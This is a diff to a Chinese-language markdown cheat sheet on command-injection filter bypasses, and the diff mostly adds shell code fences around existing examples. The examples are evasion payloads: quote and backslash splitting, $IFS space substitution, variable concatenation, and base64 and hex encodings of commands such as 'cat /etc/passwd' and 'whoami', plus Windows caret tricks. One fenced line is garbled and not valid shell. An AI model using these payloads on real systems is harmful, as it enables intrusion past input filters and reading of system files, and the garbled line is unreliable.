@@ -65,9 +65,12 @@ shell_code
 
 使用反斜线、单引号、变量拼接、base64编码
 
+```shell
 `ca\t$IFS/etc/passw'o'r\d` //能正常执行 必须跟绝对路劲
-
+```
+```shell
 `a='l';b='s';$a$b`
+```
 
 `echo d2hvYW1p | base64 -d` //base64
 
@@ -75,7 +78,9 @@ shell_code
 
 `$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")` //十六进制
 
+```shell
 *k* = ′*dd*′;{IFS}${9}{n\l,/etc$kkkkkkk$kkkkd/pa’s’sddks``}
+```
 
 **文件名过滤绕过**
 
@@ -100,8 +105,9 @@ windows系统
 `((whoa^m""i))`
 
 变量拼接：
-
+```shell
 `Whoami = a=who&&b=ami&&$a$b`
+```
 
 中间件命令执行使用替代函数
 
@@ -116,8 +122,9 @@ windows系统
 find 读取目录
 
 **过滤空格绕过**
-
+```shell
 `$IFS $IFS$9 ${IFS}{cat,/etc/passwd}`
+```
 
 **连接符过滤**
 
